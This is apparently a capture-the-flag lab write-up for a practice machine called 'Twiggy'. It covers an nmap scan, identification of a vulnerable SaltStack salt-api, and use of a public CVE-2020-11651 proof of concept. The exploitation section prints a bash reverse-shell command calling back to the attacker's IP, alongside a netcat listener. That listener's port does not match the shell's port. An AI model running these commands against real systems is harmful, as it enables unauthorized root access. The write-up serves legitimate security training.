<h2>Recon</h2>
  
  <h3>PortScan</h3>
  
  >command: sudo nmap -A -p- -T4 -v
```
# Nmap 7.93 scan initiated Sat Jan  7 10:06:55 2023 as: nmap -A -v -T4 -p- -oN twiggy 192.168.242.62
Nmap scan report for 192.168.242.62
Host is up (0.44s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 447d1a569b68aef53bf6381773165d75 (RSA)
|   256 1c789d838152f4b01d8e3203cba61893 (ECDSA)
|_  256 08c912d97b9898c8b3997a19822ea3ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-favicon: Unknown favicon MD5: 11FB4799192313DD5474A343D9CC0A17
|_http-title: Home | Mezzanine
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: nginx/1.16.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 3.X|4.X|5.X (89%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:5.1
Aggressive OS guesses: Linux 3.10 - 3.12 (89%), Linux 4.4 (89%), Linux 4.9 (89%), Linux 3.10 - 3.16 (86%), Linux 3.10 - 4.11 (85%), Linux 3.11 - 4.1 (85%), Linux 3.2 - 4.9 (85%), Linux 5.1 (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.003 days (since Sat Jan  7 10:08:04 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   698.61 ms 192.168.49.1
2   698.68 ms 192.168.242.62

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan  7 10:12:07 2023 -- 1 IP address (1 host up) scanned in 312.17 seconds
```

We have 6 ports opened here, port 22 which runs ssh, port 53 which runs domain, port 80,8000 which runs http, port 4505,4506 which runs zmtp. We won't waste our time on port 80 because I din't find anything interesting there. This means our enumeration will be focused more on port 8000.


<h2>Enumeration</h2>

  Going to the webpage should get you something like this

![image](https://user-images.githubusercontent.com/126628077/222027526-326df050-f1bc-47c9-8d0e-e84616a9ad5e.png)

Lets try checking the header using curl

>command: curl -v http://192.168.87.62:8000/

![image](https://user-images.githubusercontent.com/126628077/222029279-e15a72ea-5f99-463c-83f5-3d482a21fc86.png)

From the screenshot above we can see that it is running salt-api/3000-i, checking it up online I found this

![image](https://user-images.githubusercontent.com/126628077/222030012-7a1b8f63-701e-4ee3-950e-80e5b5c4c8b2.png)

So,this means there is an exploit for it

![image](https://user-images.githubusercontent.com/126628077/222030472-1629245e-19da-4672-85e7-1db9ea7fa15c.png)

>Link:https://github.com/jasperla/CVE-2020-11651-poc

Now, lets clone this repository and install the necessary requirements

```
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Twiggy]
└─$ git clone https://github.com/jasperla/CVE-2020-11651-poc
Cloning into 'CVE-2020-11651-poc'...
remote: Enumerating objects: 30, done.
remote: Counting objects: 100% (30/30), done.
remote: Compressing objects: 100% (20/20), done.
remote: Total 30 (delta 12), reused 26 (delta 10), pack-reused 0
Receiving objects: 100% (30/30), 8.61 KiB | 8.61 MiB/s, done.
Resolving deltas: 100% (12/12), done.
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Twiggy]
└─$ cd CVE-2020-11651-poc 
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/…/PG/pg_practice/Twiggy/CVE-2020-11651-poc]
└─$ pip3 install salt
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: salt in /usr/local/lib/python3.11/dist-packages (3005.1)
Requirement already satisfied: Jinja2 in /usr/lib/python3/dist-packages (from salt) (3.0.3)
Requirement already satisfied: jmespath in /usr/local/lib/python3.11/dist-packages (from salt) (1.0.1)
Requirement already satisfied: msgpack!=0.5.5,>=0.5 in /usr/lib/python3/dist-packages (from salt) (1.0.3)
Requirement already satisfied: PyYAML in /usr/lib/python3/dist-packages (from salt) (6.0)
Requirement already satisfied: MarkupSafe in /usr/lib/python3/dist-packages (from salt) (2.1.1)
Requirement already satisfied: requests>=1.0.0 in /usr/lib/python3/dist-packages (from salt) (2.28.1)
Requirement already satisfied: distro>=1.0.1 in /usr/lib/python3/dist-packages (from salt) (1.8.0)
Requirement already satisfied: contextvars in /usr/local/lib/python3.11/dist-packages (from salt) (2.4)
Requirement already satisfied: psutil>=5.0.0 in /usr/local/lib/python3.11/dist-packages (from salt) (5.9.4)
Requirement already satisfied: pyzmq<=20.0.0 in /usr/local/lib/python3.11/dist-packages (from salt) (20.0.0)
Requirement already satisfied: pycryptodomex>=3.9.8 in /usr/lib/python3/dist-packages (from salt) (3.11.0)
Requirement already satisfied: immutables>=0.9 in /usr/local/lib/python3.11/dist-packages (from contextvars->salt) (0.19)

```

Now that we are done with that, lets go ahead and exploit this vulnerability


<h2>Exploitation</h2>

So, we are going to run this exploit and see what happens

>command:python3 exploit.py --master 192.168.223.62  --exec whoami 

![image](https://user-images.githubusercontent.com/126628077/222032537-6f4f6ee1-5ba2-40ed-950f-5c7ac6a35815.png)

since the "whoami" command got executed successfully, this means we can go ahead to create a reverse shell so we can get a shell back on our kali

We'll be using 2 different terminals, on the first terminal you run the exploit while on the second terminal you set up your netcat listener

>command (first termminal):python3 exploit.py --master 192.168.87.62  --exec "bash -i >& /dev/tcp/192.168.49.87/1234 0>&1"
>command (second terminal):rlwrap nc -lvnp 80

_Ensure you change the IP to your IP address_

![image](https://user-images.githubusercontent.com/126628077/222035586-a0fbc95a-1fea-4299-b39f-fd75b6802081.png)

![image](https://user-images.githubusercontent.com/126628077/222035626-72755ff8-ef16-4f28-9180-bf900940d35e.png)

Boom!!! We got a shell as root.

Now that we have gotten the root shell our work is done





















